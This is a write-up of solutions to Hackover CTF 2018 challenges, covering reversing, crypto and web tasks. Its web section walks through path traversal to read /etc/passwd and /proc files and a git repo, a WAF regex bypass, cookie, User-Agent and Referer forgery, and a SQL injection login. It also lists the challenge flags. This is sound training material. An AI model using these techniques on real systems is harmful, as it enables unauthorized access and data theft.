# Hackover CTF 2018


**It's recommended to read our responsive [web version](https://balsn.tw/ctf_writeup/20181006-hackoverctf/) of this writeup.**


 - [Hackover CTF 2018](#hackover-ctf-2018)
   - [Reverse](#reverse)
     - [flagmaker](#flagmaker)
     - [bwv2342](#bwv2342)
   - [Crypto](#crypto)
     - [secure_hash v2](#secure_hash-v2)
     - [oblivious transfer](#oblivious-transfer)
   - [web](#web)
     - [cyberware](#cyberware)
     - [ez web](#ez-web)
     - [i-love-heddha](#i-love-heddha)
     - [who knows john dows?](#who-knows-john-dows)



## Reverse

### flagmaker

https://github.com/sasdf/ctf-tasks-writeup/tree/master/writeup/2018/HackOver/rev/flagmaker

### bwv2342

This chal provide a movfuscated binary. Knowing that movfuscated binary is hard to reverse, We first simply run the binary with strace  and found that it open `flag.txt`. After some trial and error (with knowledge of the flag is of form hackover18{some text}), we quickly found out right input will be responsed with different output compared with wrong input. Now simply bruteforce the flag.

flag : `hackover18{M0V_70_7h4_w0h173mp3r13r73_Kl4v13r}`

## Crypto

### secure_hash v2

https://github.com/sasdf/ctf-tasks-writeup/tree/master/writeup/2018/HackOver/crypto/secure_hash_v2

### oblivious transfer

https://github.com/sasdf/ctf-tasks-writeup/tree/master/writeup/2018/HackOver/crypto/oblivious

## web

### cyberware

(bookgin)

We are given a webserver, which we can read some files in the directory. How about reading other directories? After a few tests, I think the backend it's probably heavilty WAFed. For example, if we have a trailing slash:

```sh
$ curl 'http://cyberware.ctf.hackover.de:1337/fox.txt/' -sD -        
HTTP/1.1 403 You shall not list!
Server: Linux/cyber
Date: Fri, 05 Oct 2018 20:38:38 GMT
Content-type: text/cyber

Protected by Cyberware 10.1
```

Or the path starts with dot:

```sh
$ curl 'http://cyberware.ctf.hackover.de:1337/.a' -sD -        
HTTP/1.1 403 Dots are evil
Server: Linux/cyber
Date: Fri, 05 Oct 2018 21:07:18 GMT
Content-type: text/cyber

Protected by Cyberware 10.1
```

The filtering rules are listed below:

1. if len(path) == 1: path will be replaced to `/`
2. if len(path) > 1: the last character of the path cannot be `/`
3. The path cannot start with `/.`

Actually I even write a fuzzing script, trying to use a brute-force way to bypass the WAF. 
```python
from itertools import product
for i in product(*[['.', '/', './', '../', 'cat.txt'] for _ in range(4)]):
   ...
```

This script gives me some interesting findings: 

1. The path can start with multiple slashes. 
2. `../` can be used

So I try to read `/etc/passwd` by visiting `http://cyberware.ctf.hackover.de:1337//../../../etc/passwd`. It works! The next problem is to find the flag, but it's not in `/flag` nor `/home/ctf/flag`. Let's try to get more inforation:

```
/proc/self/stat
1 (cyberserver.py) S 0 1 1 34816 1 4194560 1983058 0 51 0 40392 20243 0 0 20 0 187 0 75328 268914688 4920 18446744073709551615 6074536218624 6074536221952 128479825392640 0 0 0 0 16781312 2 0 0 0 17 0 0 0 7 0 0 6074538319272 6074538319880 6075320318234 128479825398243 128479825398277 128479825398277 128479825398391 0
```

We have the filename of the source code. You can refer to [p4's writeup](https://github.com/p4-team/ctf/tree/master/2018-10-06-hackover/web_cyberware) for the complete source code. The most important snippet is:

```python
if path.startswith('flag.git') or search('\\w+/flag.git', path):
    self.send_response(403, 'U NO POWER')
    self.send_header('Content-type', 'text/cyber')
    self.end_headers()
    self.wfile.write(b"Protected by Cyberware 10.1")
    return
```

`\w` [means any word character](https://stackoverflow.com/a/1576812). However this trivial to bypass via two slashes `//home/ctf//flag.git/HEAD`.

The rest is easy: extract the git repo using [gitdumper](https://github.com/internetwache/GitTools#dumper). 

We have the flag `hackover18{Cyb3rw4r3_f0r_Th3_w1N}`.

### ez web

(bookgin)

The challenge only shows `under construction` in the index page. There is nothing interesting in the website...... I'm at a loss in the beginnning and I don't know what to do next.

Maybe try to profile the backend. Visiting `http://ez-web.ctf.hackover.de:8080/abc` shows the following error page:
```
Whitelabel Error Page

This application has no explicit mapping for /error, so you are seeing this as a fallback.
Thu Oct 11 01:39:16 GMT 2018
There was an unexpected error (type=Not Found, status=404).
No message available
```

The backend seems to be [Spring Boot](https://www.logicbig.com/tutorials/spring-framework/spring-boot/disable-default-error-page.html). Then, nothing interesting.

Then I think it's time to use some scanner: [DirBuster](https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project) to burst the path. I always use scanner in a very low request rate(1-2 requests per second), trying to minimize the impact on the server. Surprisingly it found `http://ez-web.ctf.hackover.de:8080/flag/` return HTTP 200. Visit the page and there is a link to `flag.txt`.

```sh
$ curl http://ez-web.ctf.hackover.de:8080/flag/flag.txt -sD -
HTTP/1.1 200 
Set-Cookie: isAllowed=false
Content-Type: text/plain;charset=UTF-8
Content-Length: 219
Date: Thu, 11 Oct 2018 01:42:48 GMT

<!DOCTYPE html>
	<head>
		<title>Restricted Access</title>
	</head>
	<body>
		<p>You do not have permission to enter this Area. A mail has been sent to our Admins.<br/>You shall be arrested shortly.</p>
	</body>
</html>
```

Just modify the cookie and get the flag.

```sh
$ curl 'http://ez-web.ctf.hackover.de:8080/flag/flag.txt' --cookie "isAllowed=true"
hackover18{W3llD0n3,K1d.Th4tSh0tw4s1InAM1ll10n}
```

### i-love-heddha

(bookgin)

The challenge is almost the same as the last one. Starting with:
```sh
curl 'http://207.154.226.40:8080/flag/flag.txt' -sD - --cookie 'isAllowed=true'
HTTP/1.1 200 
Content-Type: text/plain;charset=UTF-8
Content-Length: 175
Date: Thu, 11 Oct 2018 01:46:47 GMT

<!DOCTYPE html>
	<head>
		<title>Wrong Browser detected</title>
	</head>
	<body>
		<p>You are using the wrong browser, 'Builder browser 1.0.1' is required</p>
	</body>
</html>
```

It's definitely user-agent:
```sh
$ curl 'http://207.154.226.40:8080/flag/flag.txt' --cookie 'isAllowed=true' -H 'User-Agent: Builder browser 1.0.1'
<!DOCTYPE html>
	<head>
		<title>Almost</title>
	</head>
	<body>
		<p>You are refered from the wrong location hackover.18 would be the correct place to come from.</p>
	</body>
</html>
```

It's referer, and then get the flag!

```sh
$ curl -s 'http://207.154.226.40:8080/flag/flag.txt' --cookie 'isAllowed=true' -H 'User-Agent: Builder browser 1.0.1' --referer 'hackover.18' | base64 -d
hackover18{4ngryW3bS3rv3rS4ysN0}
```

It's worth to mention here: after the problem released, it takes only about a few minutes and one team got the firstblood. Therfore, this problem should be intuitive and easy to tackle. 

On the contrary, we will stay away from some challenges that few teams solved, and those teams are not in top 30. This probably means the challenge itself is poorly designed, or some guessing / mind-reading the organizers is required such that even the top 10 teams cannot solve.

### who knows john dows?

(bookgin)
 
> You know nothing, Jon Snow - Ygritte

We are given a website and a Github link to the source code [https://github.com/h18johndoe/user_repository/blob/master/user_repo.rb](https://github.com/h18johndoe/user_repository/blob/master/user_repo.rb).
```ruby
class UserRepo

  def initialize(database)
    @database = database
    @users = database[:users]
  end

  def login(identification, password)
    hashed_input_password = hash(password)
    query = "select id, phone, email from users where email = '#{identification}' and password_digest = '#{hashed_input_password}' limit 1"
    puts "SQL executing: '#{query}'"
    @database[query].first if user_exists?(identification)
  end

  def user_exists?(identification)
    !get_user_by_identification(identification).nil?
  end

  private

  def get_user_by_identification(identification)
    @users.where(phone: identification).or(email: identification).first
  end

  def hash(password)
    password.reverse
  end

end
```

If we have a correct phone or email, we can easily perform a SQL injection. It's hard to come out a way to guess the phone, but the email is usually public. Maybe we can take a look at the git commit:

```sh
$ git log
commit b26aed283d56c65845b02957a11d90bc091ac35a (HEAD -> master, origin/master, origin/HEAD)
Author: John Doe <angelo_muh@yahoo.org>
Date:   Tue Oct 2 23:55:57 2018 +0200

    Add login method

commit 5383fb4179f1aec972c5f2cc956a0fee07af353a
Author: John Doe <jamez@hemail.com>
Date:   Tue Oct 2 23:04:13 2018 +0200

    Add methods

commit 2d3e1dc0c5712efd9a0c7a13d2f0a8faaf51153c
Author: John Doe <john_doe@gmail.com>
Date:   Tue Oct 2 23:02:26 2018 +0200

    Add dependency injection for database

commit 3ec70acbf846037458c93e8d0cb79a6daac98515
Author: John Doe <john_doe@notes.h18>
Date:   Tue Oct 2 23:01:30 2018 +0200

    Add user repo class and file
```

Just try all of them. The correct mail is `john_doe@notes.h18`, and then we simply login with `' or 1=1 --` SQL injection. Note that the string will be reversed.
